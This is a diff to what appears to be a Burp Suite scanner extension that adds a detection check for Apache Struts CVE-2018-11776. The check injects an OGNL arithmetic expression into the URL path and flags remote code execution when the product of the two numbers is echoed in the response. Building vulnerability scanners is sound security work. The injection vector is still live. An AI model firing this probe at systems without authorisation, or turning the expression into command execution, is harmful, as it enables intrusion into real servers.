@@ -135,6 +135,7 @@ class PerRequestScans(IScannerCheck):
             self.doCodePathScan,
             self.doStrutsScan,
             self.doStruts_2017_9805_Scan,
+            self.doStruts_2018_11776_Scan,
             self.doXXEPostScan,
         ]
 
@@ -260,6 +261,49 @@ class PerRequestScans(IScannerCheck):
 
         return []
 
+    
+# Based on vulnerability discovered by Man Yue Mo: https://lgtm.com/blog/apache_struts_CVE-2018-11776
+# Tested against instance set up like https://github.com/xfox64x/CVE-2018-11776
+    def doStruts_2018_11776_Scan(self, basePair):
+
+        # Don't bother if it isn't a 302 response
+        origResponse = safe_bytes_to_string(basePair.getResponse())
+        if (origResponse.find('302 Found') < 0):
+            return[]
+        
+        path = helpers.analyzeRequest(basePair).getUrl().getPath()
+        last_slash = 0
+        # The exploit depends upon injecting OGNL into the path of a vulnerable action, so we find
+        #the last slash in the URL and insert our payload
+        for i in range(len(path)):
+            if path[i] == '/':
+                last_slash = i
+
+        x = random.randint(999, 9999)
+        y = random.randint(999, 9999)
+        # The payload here is a simple math(s) problem - because multiplication platform-agnostic
+        attack_string = "/$%7B("+str(x)+"*"+str(y)+")%7D"
+        attack_path = path[:last_slash]+attack_string+path[last_slash:]
+
+        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path,attack_path, 1)
+        debug_msg('  The outgoing 2018-11776 request looks like:\n\n' + newReq + '\n')
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), newReq) # Issue the actual request
+        asciiResponse = "".join(map(chr,attack.getResponse()))
+
+        # If the response includes the payload product, system is vulnerable
+        if str(x*y) in asciiResponse:
+            # Add highlighting so the factors (request) and product (response) are easy to identify
+            requestMarkers = [jarray.array([newReq.find(str(x)+'*'+str(y)), newReq.find(str(x)+'*'+str(y))
+                + len(str(x)+'*'+str(y))],'i')]
+            responseMarkers = [jarray.array([asciiResponse.find(str(x*y)), asciiResponse.find(str(x*y)) +
+                len(str(x*y))],'i')]
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [callbacks.applyMarkers(attack, requestMarkers, responseMarkers)],
+                'Struts2 CVE-2018-11776 RCE',
+                "The application appears to be vulnerable to CVE-2018-11776, enabling arbitrary code execution.",
+                'Firm', 'High')]
+
+        return []
 
 
 
